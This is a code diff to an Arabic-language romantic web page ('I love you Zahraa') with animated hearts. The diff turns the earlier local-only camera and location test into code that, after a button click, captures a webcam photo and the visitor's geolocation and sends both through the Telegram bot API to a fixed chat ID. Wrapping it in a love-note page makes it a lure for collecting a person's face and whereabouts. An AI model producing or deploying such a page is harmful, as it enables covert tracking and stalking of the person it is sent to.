@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>أحبك زهراء</title>
+<title>أحبج زهراء</title>
 <style>
   body {
     margin: 0;
@@ -28,7 +28,21 @@
     100% { transform: translateY(-50px) scale(0.5); opacity: 0; }
   }
 
-  /* عنصر الفيديو والكانفاس لو تحب تعرض التجربة محليًا */
+  #sendBtn {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    padding: 15px 30px;
+    font-size: 18px;
+    background-color: black;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    z-index: 1000;
+  }
+
   video, canvas {
     position: fixed;
     bottom: 10px;
@@ -37,18 +51,19 @@
     height: 120px;
     border: 2px solid #000;
     border-radius: 5px;
-    z-index: 1000;
+    z-index: 999;
   }
 </style>
 </head>
 <body>
 
+<button id="sendBtn">إرسال صورة وموقعي</button>
 <video autoplay playsinline></video>
 <canvas width="160" height="120"></canvas>
 
 <script>
   // ======== حركة القلوب ========
-  const texts = ['❤️ أحبك زهراء ❤️'];
+  const texts = ['❤️ أحبج زهراء ❤️'];
 
   function createHeart() {
     const heart = document.createElement('div');
@@ -58,14 +73,32 @@
     heart.style.fontSize = (20 + Math.random() * 30) + 'px';
     heart.style.animationDuration = (4 + Math.random() * 3) + 's';
     document.body.appendChild(heart);
-
     setTimeout(() => heart.remove(), 7000);
   }
 
   setInterval(createHeart, 300);
 
-  // ======== تجربة الكاميرا والموقع محليًا (آمنة) ========
-  async function captureSafe() {
+  // ======== إرسال الصورة والموقع للبوت ========
+  const BOT_TOKEN = "ضع_التوكن_هنا"; // ضع توكن البوت على جهازك فقط
+  const CHAT_ID = "1037860664";       // ايدي الشات الخاص بك
+
+  async function sendPhotoAndLocation(blob, latitude, longitude) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "capture.jpg");
+
+    // إرسال الصورة
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+
+    // إرسال الموقع
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`);
+  }
+
+  // ======== التقاط الصورة والموقع بعد الضغط ========
+  document.getElementById('sendBtn').addEventListener('click', async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       const video = document.querySelector('video');
@@ -74,25 +107,26 @@
       const canvas = document.querySelector('canvas');
       const ctx = canvas.getContext('2d');
 
-      setTimeout(() => {
+      setTimeout(async () => {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        console.log("تم التقاط الصورة بأمان على الجهاز فقط");
-      }, 3000);
+        const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
 
-      navigator.geolocation.getCurrentPosition(position => {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        console.log("موقعك الحالي (محليًا فقط):", latitude, longitude);
-      }, error => {
-        console.error("فشل الحصول على الموقع:", error);
-      });
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+          const latitude = pos.coords.latitude;
+          const longitude = pos.coords.longitude;
+
+          await sendPhotoAndLocation(blob, latitude, longitude);
+          alert("تم إرسال الصورة والموقع للبوت بنجاح!");
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+      }, 2000);
 
     } catch (err) {
       console.error("فشل الوصول للكاميرا أو الموقع:", err);
+      alert("حدث خطأ في الوصول للكاميرا أو الموقع.");
     }
-  }
-
-  captureSafe();
+  });
 </script>
 
 </body>
